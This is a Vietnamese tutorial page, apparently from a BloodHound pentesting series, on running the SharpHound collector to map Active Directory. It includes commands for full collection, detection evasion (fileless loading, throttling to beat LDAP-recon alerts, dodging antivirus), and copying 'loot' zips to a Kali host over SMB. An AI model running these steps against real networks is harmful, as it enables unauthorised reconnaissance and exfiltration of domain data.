# 03 — SharpHound (collector chạy trên Windows)

**SharpHound** là collector gốc, viết bằng C#. Chạy **trên máy Windows** (đã
join domain, hoặc dùng credential khác). Thu được nhiều dữ liệu nhất — đặc biệt
**session** và **local admin** — vì chạy ngay trong môi trường.

Hai dạng:
- **`SharpHound.exe`** — binary biên dịch sẵn.
- **`SharpHound.ps1`** — wrapper PowerShell (nạp exe trong bộ nhớ, dùng khi muốn
  chạy fileless / né ghi đĩa).

> Phiên bản phải khớp UI: **v2 → CE**, **v1 → Legacy** (xem [file 01](01-kien-truc-va-phien-ban.md)).

## A. Chạy cơ bản (domain-joined)

```powershell
# Thu tất cả
.\SharpHound.exe -c All
.\SharpHound.exe --collectionmethods All --zipfilename loot.zip --outputdirectory C:\Users\Public

# PowerShell wrapper (fileless)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public -ZipFileName loot.zip
```

- **Kết quả:** file `*_BloodHound.zip` → chuyển về máy có UI để import.

## B. Chạy với credential khác / không join domain

```powershell
# Chỉ định DC và domain, dùng LDAP username/password
.\SharpHound.exe -c All -d corp.local --domaincontroller DC01.corp.local `
   --ldapusername alice --ldappassword 'Password123!'

# Chạy dưới ngữ cảnh user khác (runas netonly) rồi gọi SharpHound
runas /netonly /user:corp.local\alice powershell
#  (nhập mật khẩu) → trong cửa sổ mới:
.\SharpHound.exe -c All -d corp.local
```

## C. CollectionMethods (giải thích từng method)

Chọn method ảnh hưởng **dữ liệu thu được** và **độ ồn**:

| Method | Thu gì | Ghi chú |
|--------|--------|---------|
| `Default` | nhóm, trust, ACL, một số session/local-admin | cân bằng |
| `All` | tất cả method (trừ một số đắt như `All`≠`GPOLocalGroup`) | đầy đủ nhất, ồn hơn |
| `Group` | thành viên nhóm | nhanh, rất ít ồn |
| `LocalAdmin`/`LocalGroup` | ai là admin local trên từng máy | cần chạm SMB từng host |
| `Session`/`LoggedOn` | ai đang đăng nhập ở đâu | **quan trọng để săn DA**, cần quyền |
| `ACL` | DACL trên object | cho ACL abuse |
| `Trusts` | quan hệ trust | cho nhảy domain |
| `Container`, `GPOLocalGroup` | OU/GPO | cho GPO abuse |
| `DCOnly` | **chỉ hỏi DC qua LDAP**, không chạm máy trạm | **kín nhất**, thiếu session/localadmin |
| `ComputerOnly` | chỉ session + local admin | bổ sung cho DCOnly |

```powershell
# Kín: chỉ chạm DC
.\SharpHound.exe -c DCOnly
# Đầy đủ nhưng chia 2 lượt (kín trước, rồi bổ sung session khi cần)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe -c Session,LocalAdmin
```

## D. OPSEC / tùy chọn tránh phát hiện

```powershell
# Thu nhiều lần theo chu kỳ (bắt session thay đổi) — nhưng ồn
.\SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:15:00
# Giảm tốc để né ngưỡng phát hiện
.\SharpHound.exe -c All --throttle 1000 --jitter 30        # ms + % jitter
# Giới hạn phạm vi
.\SharpHound.exe -c All --searchbase "OU=Workstations,DC=corp,DC=local"
.\SharpHound.exe -c All --domain child.corp.local
# Loại trừ DC khỏi touch (chỉ LDAP)
.\SharpHound.exe -c DCOnly --excludedcs
```

- `--loop` hữu ích để bắt **ai đăng nhập lúc nào** (session bay vào/ra).
- `--throttle/--jitter` làm chậm để qua mặt cảnh báo "LDAP recon".

## E. Chuyển zip về máy UI

```powershell
# qua SMB share của Kali
net use \\<kali_ip>\share /user:a a
copy *_BloodHound.zip \\<kali_ip>\share\
```

```bash
# Kali: dựng share nhận file
impacket-smbserver share . -smb2support -username a -password a
# hoặc evil-winrm: download C:\Users\Public\xxx_BloodHound.zip
```

## F. Lỗi thường gặp với SharpHound

- **"ID resolution" chậm / treo**: môi trường lớn → dùng `--searchbase`, chia method.
- **Thiếu session/localadmin**: bạn không phải admin → chỉ có `DCOnly`; cần chạm
  máy với quyền phù hợp để lấy `Session`/`LocalAdmin`.
- **Zip rỗng / import lỗi**: sai version so với UI (v1↔Legacy, v2↔CE).
- **AV chặn `SharpHound.exe`**: dùng `SharpHound.ps1` fileless, hoặc collector từ
  Linux ([file 04](04-collectors-da-nen-tang.md)) để không chạm máy Windows.

→ Khi không có/không muốn dùng máy Windows: dùng collector đa nền tảng từ Kali
([file 04](04-collectors-da-nen-tang.md)).
